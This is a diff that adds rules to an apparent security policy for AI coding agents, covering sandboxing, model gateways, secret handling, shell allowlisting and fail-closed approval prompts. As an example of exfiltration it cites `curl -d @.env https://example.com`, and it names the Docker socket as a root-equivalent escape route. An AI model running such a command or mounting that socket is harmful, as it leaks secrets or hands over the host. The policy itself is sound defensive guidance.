@@ -5,6 +5,9 @@
 * A local model server that is bound to all interfaces MUST be protected by a firewall rule.
 * Proprietary code and personal data MUST NOT be submitted to a model service that has not been approved for that class of data.
 * An agent MUST NOT run with approval prompts disabled outside a sandbox in which at least one part of the lethal trifecta is absent by construction.
+* An unanswered approval prompt MUST be treated as a denial.
+* The host's container-runtime socket MUST NOT be mounted into a container in which an agent runs.
+* An agent MUST NOT be scoped to the filesystem root or to a user's home directory.
 * Authorization, verification, and approval MUST be enforced outside the model.
 * Changes to a lockfile MUST be reviewed like any other change.
 * The audit record of what an agent was asked and what it did MUST be engineered into every unattended workflow, and into any work subject to regulatory or contractual audit obligations.
@@ -82,6 +85,14 @@ A container is not a complete isolation boundary by default, and a devcontainer 
 
 A default devcontainer therefore protects the rest of the host's filesystem and processes, but removes none of the three parts of the lethal trifecta. To rely on a container as a sandbox for an agent, disable credential forwarding, keep secrets out of the mounted directory, and restrict egress to an allowlist of the hosts the task needs.
 
+If keys must be mounted into the container, mount them read-only and limit their scope. For example, where a container has to authenticate as the user (eg. to push to a code repository), prefer to give the container a key that is used for nothing but authenticating to the upstream repository, rather than supplying the user's general-purpose key.
+
+Prefer to keep signing keys on the host. You can do this by forwarding a signing agent into the container. This keeps the private key used for signing out of the container's filesystem, but the forwarded signing agent can still sign artifacts inside the container, such as commit objects.
+
+The host's container-runtime socket, eg. `/var/run/docker.sock`, MUST NOT be mounted into a container in which an agent runs. Access to that socket is equivalent to root on the host, because it can start a privileged container that mounts the host's filesystem. Where a component outside the agent's container needs the socket, for example to start other containers on the agent's behalf, keep that component unreachable from outside its own stack, and let the agent reach it only through a narrow interface.
+
+Put the security boundary outside the agent's process. A control that runs inside the agent's own process, such as a harness extension that inspects tool calls, shares the agent's fate — a bug, a misconfiguration, or a compromise of the harness disables it along with everything else. Such controls are useful defense-in-depth, and they keep a watching human-in-the-loop, but they are not a boundary. The boundary is something the agent can neither modify nor reach around — the container, a separate service that mediates the agent's access to files or networks, or the permissions of the operating system.
+
 == Network exposure
 
 Local model servers (such as Ollama) listen on `localhost` by default. Do not change this unless remote access is explicitly required.
@@ -139,6 +150,24 @@ Then match the class of data to the class of service.
 
 The same limits apply to everything a harness sends on the developer's behalf, which includes file contents, tool output, and telemetry as well as typed prompts.
 
+== Model gateways
+
+Where several tools, workflows, or people send requests to models, route that traffic through a single gateway that you operate, such as a self-hosted LiteLLM proxy. A gateway is the one place where policy can be applied deterministically to every model request, outside any agent, and without costing any agent context or attention. It can do the following.
+
+* Hold the provider keys, so that no agent or developer machine needs them.
+
+* Restrict traffic to the models and providers that the organization's AI policy approves, and to providers whose data-handling terms suit the class of data in use.
+
+* Enforce a spending limit for each key, workflow, or project.
+
+* Redact personal data from requests before they leave the trust boundary.
+
+* Screen requests for known prompt-injection patterns.
+
+* Log every request, for cost attribution and audit.
+
+A gateway holds every key and sees every request, which makes it a high-value target. Do not expose it beyond the network it serves. A gateway run by a third party is a sub-processor, subject to the same checks as any model provider.
+
 == Testing autonomous agents
 
 Running an agent against a test environment, eg. to red-team a codebase or to evaluate a harness configuration, is itself a high-risk activity. The agent is probing for weaknesses, and it may find one in its own containment.
@@ -159,6 +188,10 @@ Agents that can execute shell commands, write to the filesystem, or make network
 
 Limit the blast radius by applying the principle of least privilege to tool permissions. Grant read-only access where write access is not needed. Scope filesystem access to the specific paths the agent needs. Restrict shell access to allowlisted commands, rather than permitting arbitrary shell execution. Disable network egress entirely for agents that do not need it.
 
+Scope an agent to the project it is working on. An agent MUST NOT be scoped to the filesystem root or to a user's home directory, which would put SSH keys, credential stores, shell history, and every other project inside its boundary.
+
+An agent MUST NOT be allowed to run arbitrary shell commands. This is not simple. For example, `cat > src/index.ts` is a safe write, but `curl -d @.env https://example.com` is exfiltration. Allowlist specific programs, and reject pipes, redirects, command chaining, and command substitution. Keep off the allowlist any program that can run arbitrary code, such as language runtimes (`node`, `python`), shells (`bash`), and programs that launch other programs (`env`, `xargs`, `find -exec`).
+
 Review agent permissions before starting a task, not only when configuring a harness for the first time. A permission set that was appropriate for one task may be excessive for the next.
 
 === Secrets in context
@@ -170,6 +203,10 @@ An agent with file and shell access reads `.env` files, credential stores, shell
 * Do not start a harness from a shell whose environment holds credentials the task does not need. The agent's shell inherits that environment.
 
 * Where a task needs credentials, give the agent its own short-lived, narrowly scoped ones, never the developer's own.
+
+* Keep model provider keys out of the agent's environment altogether. Route model requests through a proxy outside the agent's sandbox, which holds the keys and attaches them to each request, so that the agent holds no key worth stealing.
+
+* A rule that denies access by filename misses a secret pasted into an ordinary file. Where the harness supports it, scan tool output for values that look like secrets, such as private-key blocks and tokens with a known prefix, and replace them with a placeholder before they reach the model. Pattern matching misses secrets with no recognizable shape, so treat this as defense in depth, not a substitute for denying access.
 
 * Treat a secret that has entered a context as compromised, and rotate it.
 
@@ -186,6 +223,8 @@ An agent MUST NOT run with approval prompts disabled unless both of the followin
 * At least one part of the lethal trifecta is absent by construction, not by instruction. In practice this usually means no credentials in the sandbox, or no network egress beyond an allowlist.
 
 Where those conditions cannot be met, pre-approve specific low-risk commands through the harness's allowlist instead of disabling the prompts wholesale. Approving every prompt without reading it is equivalent to disabling them.
+
+An approval prompt MUST fail closed. A timeout, or a session with nobody present to answer, MUST be treated as a denial. A prompt that nobody is there to answer is not a control, so unattended work relies on the sandbox and the audit record instead.
 
 == Goals without judgment
 
